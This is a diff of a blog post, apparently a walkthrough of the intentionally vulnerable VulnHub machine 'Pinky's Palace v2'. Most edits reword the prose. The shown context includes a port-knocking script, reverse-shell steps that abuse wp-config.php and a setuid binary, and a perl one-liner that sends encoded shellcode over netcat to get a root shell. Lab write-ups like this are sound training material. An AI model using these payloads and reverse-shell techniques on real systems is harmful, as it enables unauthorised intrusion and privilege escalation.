@@ -1,7 +1,7 @@
 ---
 layout: post
 date: 2018-04-29 15:03:40 +0000
-title: "A Pink Dungeon"
+title: "Surviving the Pink Dungeon"
 category: Walkthrough
 tags: [VulnHub, "Pinky's Palace"]
 comments: true
@@ -131,7 +131,7 @@ To that end, I wrote a port-knocking script, `knock.sh`, to determine the correc
 
 TARGET=$1
 
-for ports in $(cat sequence.txt); do
+for ports in $(cat permutation.txt); do
     echo "[*] Trying sequence $ports..."
     for p in $(echo $ports | tr ',' ' '); do
         nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
@@ -141,10 +141,10 @@ for ports in $(cat sequence.txt); do
 done
 {% endhighlight %}
 
-`sequence.txt` is a text file containing all the permutations of `8890,7000,666` and I use the following Python code to generate it.
+`permutation.txt` is a text file containing all the permutations of `8890,7000,666` and I use the following Python code to generate it.
 
 ```
-python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq > sequence.txt
+python -c 'import itertools; print list(itertools.permutations([8890,7000,666]))' | sed 's/), /\n/g' | tr -cd '0-9,\n' | sort | uniq > permutation.txt
 ```
 
 When `knock.sh` reaches the sequence `7000,666,8890`, it unlocks three more services, including the familiar SSH service.
@@ -254,6 +254,8 @@ _Image shows `demon` and `pinky` have the rights to edit `backup.sh`._
 
 ![screenshot-6](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-6.png)
 
+It's almost as if one thing leads to another.
+
 To read `/home/stefano/tools/qsub` and to study it in greater detail, I need to be `pinky` or `www-data`. Since I don't know `pinky`'s password, the other way is to edit any of the `.php` files in `/var/www` (the home directory of `www-data`) where `stefano` has permission to write.
 
 ```
@@ -263,7 +265,7 @@ $ find /var/www -perm /o+w
 
 I edit `wp-config.php` to run a reverse shell as `www-data`.
 
-_Image shows remote command execution on `pinkydb` as `www-data`._
+_Image shows that I can execute remote command on `pinkydb` as `www-data`._
 
 ![screenshot-7](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-7.png)
 
@@ -275,7 +277,7 @@ I copy `qsub` over to my analysis machine, and decode it back to its binary form
 
 ![screenshot-9](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-9.png)
 
-Now that `qsub` is on my machine, I can perform reverse engineering, and after stepping through the `main()` and `send()` functions:
+Now that `qsub` is on my machine, I can perform reverse engineering, and after stepping through the `main()` and `send()` functions, this is what I discover:
 
 * The program `qsub` has one argument — the message to `pinky`
 * The input password is the value of the `TERM` environment variable, and must be less than or equal to forty characters
@@ -291,7 +293,7 @@ _The image shows `system()` library function executes shell command `/bin/echo` 
 
 Since I know how `qsub` works, and it has been `setuid` to `pinky`, I can exploit it to create `/home/pinky/.ssh/authorized_keys` with the RSA key pair I control.
 
-The steps are slightly convoluted but the end result is deeply satisfactory:
+Although the steps are slightly convoluted, the end result is deeply satisfactory:
 
 1. Generate the RSA key pair on my machine
 2. Exploit `qsub` to run a `netcat` reverse shell with `pinky`'s privileges
@@ -310,11 +312,11 @@ _Image shows `pinky`'s account after logging in with the RSA private key._
 
 ![screenshot-12](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-12.png)
 
-The aim of gaining control of `pinky`'s account is so that I can edit `/usr/local/bin/backup.sh`, add this line, and run a reverse shell as `demon`.
+The ultimate aim of gaining control of `pinky`'s account is so that I can edit `/usr/local/bin/backup.sh`, add this line, and run a reverse shell as `demon`.
 
 ![screenshot-13](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-13.png)
 
-On my machine, I've set up a `netcat` listener to receive the reverse shell.
+I've set up a `netcat` listener on my machine to receive the reverse shell.
 
 ![screenshot-14](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-14.png)
 
@@ -378,7 +380,7 @@ The stage is now set for the real privilege escalation. I run the following comm
 # perl -e 'print "\x90" . "\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff\xff\xff\x48\xbb\xd7\x5f\x69\x30\xa9\x2d\x85\x1e\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xbd\x76\x31\xa9\xc3\x2f\xda\x74\xd6\x01\x66\x35\xe1\xba\xcd\xa7\xd5\x5f\x78\x6c\x69\x85\x8f\x9e\x86\x17\xe0\xd6\xc3\x3d\xdf\x74\xfd\x07\x66\x35\xc3\x2e\xdb\x56\x28\x91\x03\x11\xf1\x22\x80\x6b\x21\x35\x52\x68\x30\x65\x3e\x31\xb5\x36\x07\x1f\xda\x45\x85\x4d\x9f\xd6\x8e\x62\xfe\x65\x0c\xf8\xd8\x5a\x69\x30\xa9\x2d\x85\x1e" . "\xfb\x0c\x40\x00\x00\x00"' | nc pinkydb 31337
 ```
 
-On my `netcat` listener that I've set up, a `root` shell appears.
+A `root` shell appears on my `netcat` listener.
 
 ![screenshot-28](/assets/images/posts/pinkys-palace-v2-walkthrough/screenshot-28.png)
 
@@ -390,9 +392,9 @@ After spawning a better looking shell with a bunch of keystrokes, the flag is ba
 
 ### Afterthought
 
-To be honest, I think Pinky's Palace is a misnomer; it should be Pinky's Dungeon :sweat_smile:
+To be honest, I feel that Pinky's Palace is a misnomer; it should be Pinky's Dungeon :sweat_smile:
 
-Walking through this VM took longer than usual because I had to document down the crucial sections and had to take more screen captures. It certainly lived up to its name of being harder than the first one, with the reverse engineering of `qsub`, and the exploit development for `panel`.
+Walking through this dungeon took longer than usual because I had to document down the crucial sections and had to take more screen captures. It certainly lived up to its name of being harder than the first one, with the reverse engineering of `qsub`, and the exploit development for `panel`.
 
 I give it a :+1:
 
